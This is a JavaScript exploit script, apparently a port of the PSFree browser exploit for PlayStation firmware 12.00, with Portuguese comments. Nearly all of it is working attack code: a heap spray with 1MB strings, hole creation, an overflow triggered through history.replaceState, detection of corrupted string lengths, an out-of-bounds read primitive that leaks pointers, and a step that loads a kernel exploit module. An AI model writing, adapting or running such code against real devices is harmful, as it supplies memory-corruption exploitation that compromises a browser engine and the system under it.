/* PSFree Modular Port for FW 12.00 
   Exploit Strategy: History Buffer Overflow (1MB) -> StringImpl Corruption
*/

// 1. IMPORTAÇÕES MODULARES (Usando os arquivos que você enviou)
import { Int } from './module/int64.mjs';
import { log, die, hex } from './module/utils.mjs';

// Configuração do Exploit (Baseada no sucesso anterior)
const BASE_OFFSET = 709520; 
const OVERFLOW_AMT = 1024 * 64; 
const TARGET_SIZE = 1024 * 1024; // 1MB
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

let victims = [];

// ===========================================================================
// FUNÇÃO DE SPRAY (Alocação de Memória)
// ===========================================================================
async function prepare_heap() {
    log(`[+] Initializing Heap Spray (1MB TextDecoder)...`);
    
    // Usa TextDecoder para forçar string 8-bit (Flat String)
    // Isso garante alinhamento no Large Heap
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); // 'B'
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    victims = [];
    const SPRAY_COUNT = 80;

    for(let i=0; i<SPRAY_COUNT; i++) {
        // Cria strings únicas
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    log(`[+] Creating Holes (Feng Shui)...`);
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }

    await forceGC();
}

// ===========================================================================
// FUNÇÃO DE GATILHO (O Overflow)
// ===========================================================================
async function trigger_exploit() {
    log(`[+] Triggering Overflow at offset ${BASE_OFFSET}...`);

    try {
        let buffer = "A".repeat(BASE_OFFSET);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        // A chamada vulnerável
        history.replaceState({}, "pwn", "/" + buffer);

        return check_corruption();

    } catch(e) {
        log(`[!] Error during trigger: ${e.message}`);
        return null;
    }
}

// ===========================================================================
// FUNÇÃO DE CHECAGEM (Usando Módulos)
// ===========================================================================
function check_corruption() {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;

        try {
            // Usa o truque do Error para forçar leitura fresca do Heap
            let err = new Error(s);
            let msg = err.message;

            // 1. CHECAGEM DE LENGTH (RCE)
            if (msg.length !== PAYLOAD_SIZE) {
                log(`[!!!] JACKPOT! String ${i} Length Corrupted!`, 'green');
                log(`    Old: ${PAYLOAD_SIZE} -> New: ${msg.length}`, 'green');
                
                // Retorna a string mágica para o próximo passo
                return { type: 'RCE', str: msg, idx: i };
            }

            // 2. CHECAGEM DE CONTEÚDO (Dados)
            if (msg.charCodeAt(0) !== 66) { // 'B'
                log(`[+] Data Corruption detected at index ${i}`, 'yellow');
                return { type: 'DATA', str: msg, idx: i };
            }

        } catch(e) {}
    }
    return null;
}

// ===========================================================================
// PÓS-EXPLORAÇÃO (Usando int64.mjs)
// ===========================================================================
async function stage2_read_primitive(corrupted_str) {
    log(`[+] Initializing Stage 2: Memory Scanning...`);
    
    // Aqui usamos o módulo int64.mjs para ler endereços de 64 bits
    // A string corrompida nos permite ler além do limite
    
    let leak_offset = PAYLOAD_SIZE + 16; // Chute inicial para achar vizinhos
    
    // Simulação de leitura usando a string corrompida
    // Lê 8 bytes e cria um objeto Int64
    let low = corrupted_string_read4(corrupted_str, leak_offset);
    let high = corrupted_string_read4(corrupted_str, leak_offset + 4);
    
    let leak_ptr = new Int(low, high);
    
    log(`[+] Leaked Value from Heap: ${leak_ptr.toString()}`);
    
    if (leak_ptr.lo !== 0 || leak_ptr.hi !== 0) {
        log(`[+] Valid Pointer Found! Loading Kernel Exploit...`, 'green');
        // Se acharmos um ponteiro, carregamos o Lapse
        import('./lapse.mjs');
    } else {
        log(`[-] Leaked zeros. Memory might be empty here.`);
    }
}

// Helper para ler 4 bytes da string
function corrupted_string_read4(str, offset) {
    return (str.charCodeAt(offset) | 
           (str.charCodeAt(offset+1) << 8) | 
           (str.charCodeAt(offset+2) << 16) | 
           (str.charCodeAt(offset+3) << 24)) >>> 0;
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

// ===========================================================================
// MAIN LOOP
// ===========================================================================
async function main() {
    log("=== PSFree Modular Loaded (FW 12.00) ===");
    
    // Tenta 10 vezes antes de desistir (Persistência Modular)
    for(let attempt=1; attempt<=10; attempt++) {
        log(`\n--- Attempt ${attempt} ---`);
        
        await prepare_heap();
        let result = await trigger_exploit();

        if (result) {
            if (result.type === 'RCE') {
                // Sucesso Total: Avança para Stage 2
                await stage2_read_primitive(result.str);
                return;
            } else {
                log(`[-] Got Data Corruption but missed Header. Retrying...`);
            }
        } else {
            log(`[-] No corruption detected.`);
        }
        
        // Limpa para tentar de novo
        victims = [];
        await forceGC();
    }
    
    log("\n[!] Exploit failed after 10 attempts. Reboot required.", 'red');
}

// Inicia
main();
